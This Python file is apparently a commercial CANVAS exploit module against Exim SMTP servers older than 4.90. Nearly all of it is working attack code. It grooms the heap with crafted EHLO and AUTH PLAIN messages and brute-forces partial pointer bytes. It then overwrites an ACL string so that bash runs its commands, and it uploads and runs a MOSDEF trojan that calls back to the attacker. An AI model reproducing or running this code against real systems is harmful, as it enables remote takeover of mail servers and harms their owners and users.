#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path:
    sys.path.append('.')

import os
import re
import time
import socket
import shutil
import zipfile
import logging
import tempfile

import canvasengine
import timeoutsocket
        
from httpclientside import httpclientside
from exploitutils import *
from tcpexploit import *
from libs import yaml
from libs.canvasos import *

module_path = os.path.dirname(os.path.realpath(__file__))

with open(module_path + os.path.sep + 'canvas.yaml', 'r') as f:
    metadata = yaml.safe_load(f.read())

NAME          = metadata['NAME']
DESCRIPTION   = metadata['DESCRIPTION']
VERSION       = metadata['VERSION']
DOCUMENTATION = metadata['DOCUMENTATION']
PROPERTY      = metadata['PROPERTY']

class theexploit(tcpexploit):
   def __init__(self):
      tcpexploit.__init__(self)
      self.host = ""
      self.port = 25
      self.smtp = None
      self.timeout = 15
      #################################################################
      # the next values need to be bruteforce for an exploit reliable #
      #################################################################
      self.partial_write_bytes = [0x60, 0x8E, 0x73]  # 0xXXXXXX?3?E60
      self.acl_smtp_rcpt_offset = 0x6D8
      self.size_to_merge_heap = 8100 
      self.block_size =  8200     

   def neededListenerTypes(self):
      return [canvasengine.UNIVERSAL_MOSDEF]  

   def getargs(self):
      self.host = self.target.interface
      self.port = int(self.argsDict.get("port", self.port))
    
   def extract_version(self, banner):
      match = re.search("Exim\s(?P<major>\d+)\.(?P<minor>\d+)(?P<patch>(?:_|.)\S+|\s)", banner)
      if match: 
         res = {}
         res['major'] = int(match.group('major'))
         res['minor'] = int(match.group('minor'))
         res['patch'] = match.group('patch')[1:]
         return res
      return None

   def build_mosdef_trojan(self):
      t_os = canvasos("Linux")
      for arch in ("X64", "X86"):
         t_os.arch = arch
         try:
            ret = self.buildmosdeftrojan(self.callback.ip, self.callback.port,
                                          target_os=t_os, universal=True)
            if ret:
               return self.mosdeftrojan
         except Exception, err:
            logging.info("Problem building MOSDEF trojan: %s" % str(err))

      return None

   def smtp_exploit(self, partial_write_bytes, command=None, check=False, test_time=False, run=False):
      self.smtp.connect()
      self.smtp.readline()  # read banner
      # create a big chunk on the heap 
      self.smtp.ehlo("1" * self.size_to_merge_heap) # multiple alloc of this size are made
      self.smtp.ehlo("EximSMTPExploit1")   # release the previous allocs and merge them

      # split the big chunk, memory layout:
      #  ->  freed chunk 0x2020 size
      #  ->  ehlo in use chunk 0x2020 size 
      #  ->  freed chunk greater than 0x2020 size
      self.smtp.writeline("\xFF" * 2000)  # eat a chunk of 0x2020 size
      self.smtp.readline()
      self.smtp.ehlo("2" * self.block_size)  # eat a chunk of 0x2020 and release of previus chunk

      # overwrite the in_use ehlo chunk size of 0x2020 to 0x20f0
      data = "3" * self.block_size
      data = data.encode('base64').replace('\n', '').replace('=', '')[:-1] + 'PE' 
      self.smtp.authplain(data, encode=False)

      # repair the previous size of new next chunk to be
      # able to free the our extended ehlo chunk (now with size 0x20F0) 
      data = '4' * 0xB0                  # padding to start of next chunk from our chunk extended
      data += struct.pack('<Q', 0)       # previous size of next chunk from our chunk extended
      data += struct.pack('<Q', 0x1F51)  # size of next chunk from our ehlo chunk extended
      data = data.ljust(self.block_size, '4')
      self.smtp.authplain(data, trim=True)

      # release all allocate chunks, now our extended chunk which
      # overlaps another chunk is in the unsorted bin
      self.smtp.ehlo("EximSMTPExploit2")

      # eat some chunks to align the heap
      self.smtp.writeline("\xFF" * 2000)  # eat a chunk of 0x2020 size
      self.smtp.readline()
      self.smtp.writeline("\xFF" * 2000)  # eat a chunk of 0x2020 size
      self.smtp.readline()
      # create a fake chunk header for our extended chunk, this is free and merged (size 0x4110)
      # the extended chunk is next to be returned by malloc after this alloc
      data = '5' * 0xB0                  # padding to start of next chunk from our chunk extended
      data += struct.pack('<Q', 0x4110)  # previous size of next chunk from our chunk extended
      data += struct.pack('<Q', 0x1F50)  # size of next chunk from our ehlo chunk extended
      data = data.ljust(self.block_size, '5')
      self.smtp.authplain(data, trim=True)

      # in this point we cant determine if the target is vulnerable or not
      if check:
         data = '6' * self.block_size + struct.pack('<Q', 0x2021) + ''.join(map(chr, partial_write_bytes))
         data = data.encode('base64').replace('\n', '').replace('=', '') + '_'
         try:
            self.smtp.authplain(data, encode=False)
            self.smtp.ehlo("EximSMTPExploit3")
            self.smtp.close()
            return False         # return False if not crash
         except Exception as e:   
            self.smtp.close()         
            return True          # return True if crash

      # allocate our chunk extended and overwrite partially a pointer of a store_block
      # to will be freed later
      data = '6' * self.block_size + struct.pack('<Q', 0x2021) + ''.join(map(chr, partial_write_bytes))
      data = data.encode('base64').replace('\n', '').replace('=', '')
      data += '_'  # we added a not valid base64 char to avoid that the function write a null byte in the end
      self.smtp.authplain(data, encode=False)

      # release all allocate chunks, now the chunk with the acl_smtp_rcpt string is free
      # and next to be allocate by us, we can overwrite this string by an string to be
      # extended and evaluated as an shell command
      self.smtp.ehlo("EximSMTPExploit3")      

      # allocate the chunk with the acl_smtp_rcpt string and overwrite it
      new_acl_smtp_rcpt = '${run{/bin/bash -c "%s"}}' % command
      data = '7' * self.acl_smtp_rcpt_offset + new_acl_smtp_rcpt + '\x00'
      # data.ljust(self.block_size - 0x1000, '\x00')  
      data = data.ljust(self.block_size - 0x10, '\x00')  #
      self.smtp.authplain(data)

      # trigger to eval our new_acl_smtp_rcpt string which contains our payload
      test = None
      test = time.time()
      if test_time: test = time.time()
      self.smtp.mailfrom("postmaster@localhost", run=run)  # maybe we can change it?
      self.smtp.rcpt("postmaster@localhost", run=run)      # maybe we can change it?     
      if test_time: test = time.time() - test      
      self.smtp.close()
      return test

   def run(self):
      self.setInfo("%s - in progress..." % NAME)
      timeoutsocket.setDefaultSocketTimeout(self.timeout)
      self.getargs()
      self.smtp = SMTP_Client(self.host, self.port, self.gettcpsock, timeout=self.timeout)
      self.smtp.connect()
      banner = self.smtp.readline()
      version = self.extract_version(banner)
      self.smtp.close()

      if version:
         logging.info("Exim SMTP version (from banner): %s" % str(version))
      else:
         logging.info("Can't get exim version from banner")

      if version and (version['major'] > 4 or (version['major'] == 4 and version['minor'] >= 90)):
         logging.info("Exim version is not vulnerable")
         return 0

      logging.info("Testing if target is vulnerable...")
      
      if self.smtp_exploit([0xCA, 0xFE, 0xBA, 0xBE], check=True): # force crash if is vulnerable
         logging.info("Target appears to be vulnerable")
      else:
         logging.info("The target is not vulnerable, exiting")
         self.setInfo("%s - done (failed)" % NAME)
         return 0

      # build candidates for partial overwrite (only this version of exim)
      candidates = []
      for i in range(16):
         for j in range(16):
            candidates.append([
               self.partial_write_bytes[0],
               (self.partial_write_bytes[1] & 0x0F) | (i << 4),
               (self.partial_write_bytes[2] & 0x0F) | (j << 4),
            ])
      logging.info("Bruteforcing partial bytes to overwrite...")

      time2wait = 10
      potential_partial_bytes = []
      for candidate in candidates:
         if not self.smtp_exploit(partial_write_bytes=candidate, check=True):
            logging.info("Found potential candidate to overwrite: %s" % ' '.join(map(hex, candidate)))
            potential_partial_bytes.append(candidate)
            
      correct_partial_bytes = None

      # upload mosdef shell
      for partial_bytes in potential_partial_bytes:
         seconds_to_wait = 10
         try:
            res = self.smtp_exploit(partial_bytes, command='sleep %d' % seconds_to_wait, test_time=True)
            if res >= seconds_to_wait:
               correct_partial_bytes = partial_bytes
               logging.info("Found correct partial bytes: %s" % ' '.join(map(hex, correct_partial_bytes)))
               break
         except:
            pass

      mosdeftrojan = self.build_mosdef_trojan()
      mosdeftrojan = mosdeftrojan.encode('base64').replace('\n', '').replace('=', '')

      if correct_partial_bytes and mosdeftrojan:
         tmp_fname = tempfile.mktemp() 
         trojan_fname = tempfile.mktemp() 
         logging.info("Uploading mosdef trojan to %s" % tmp_fname)
         command = 'touch %s' % tmp_fname
         self.smtp_exploit(correct_partial_bytes, command=command)

         for index in range(0, len(mosdeftrojan), 256):
            command = 'echo -ne \'%s\' >> %s' % (mosdeftrojan[index:index + 256], tmp_fname)
            self.smtp_exploit(correct_partial_bytes, command=command)

         logging.info("Mosdef trojan uploaded, running and waiting for callback...")
         self.smtp_exploit(correct_partial_bytes, command='base64 -d %s > %s' % (tmp_fname, trojan_fname))
         self.smtp_exploit(correct_partial_bytes, command='chmod +x %s' % trojan_fname)         
         self.smtp_exploit(correct_partial_bytes, command='%s & id' % trojan_fname, run=True)
         self.setInfo("%s - done (success)" % NAME)
         return 1

      logging.info("Can't exploit the target, exiting")
      self.setInfo("%s - done (failed)" % NAME)
      return 0


class SMTP_Client:
   """ """
   def __init__(self, host, port, gettcpsock, tls=False, timeout=10):
      self.host = host
      self.port = port
      self.gettcpsock = gettcpsock
      self.sock = None
      self.fd   = None
      self.tls  = tls
      self.timeout = timeout

   def connect(self, timeout=None):
      self.timeout = timeout if timeout else self.timeout
      self.sock = self.gettcpsock()
      self.sock.settimeout(self.timeout)
      self.sock.connect((self.host, self.port))
      self.fd = self.sock.makefile("rw", bufsize=0)

   def close(self):
      self.fd.close()
      self.sock.close()

   ## 
   ## IO methods
   ## 
   def write(self, data):
      self.fd.write(data)

   def writeline(self, data):
      self.write(data + "\n")

   def read(self, size):
      return self.fd.read(size)

   def readuntil(self, until):
      if until == '': return ''
      data = ''
      while until not in data:
         c = self.read(1)
         if c == '': self.write('xxxx')  # raise Exception if connection is closed
         data += c
      return data

   def readline(self):
      return self.readuntil('\n')

   ##
   ## SMTP Methods
   ##
   def ehlo(self, name):
      self.writeline("EHLO %s" % name)
      return self.readuntil("HELP\r\n")

   def authplain(self, data, encode=True, trim=False):
      if encode:
         if trim:
            self.writeline("AUTH PLAIN " + data.encode('base64').replace('\n', '').replace('=', ''))
         else:
            self.writeline("AUTH PLAIN " + data.encode('base64').replace('\n', ''))
      else:
         self.writeline("AUTH PLAIN " + data)

      return self.readline()

   # run parameter is used to avoid crash canvas with an timeout exception
   def mailfrom(self, mail, run=False):
      self.writeline("MAIL FROM:<%s>" % mail)
      return self.readline() if not run else ''

   # run parameter is used to avoid crash canvas with an timeout exception
   def rcpt(self, mail, run=False):
      self.writeline("RCPT TO:<%s>" % mail)
      return self.readline() if not run else ''
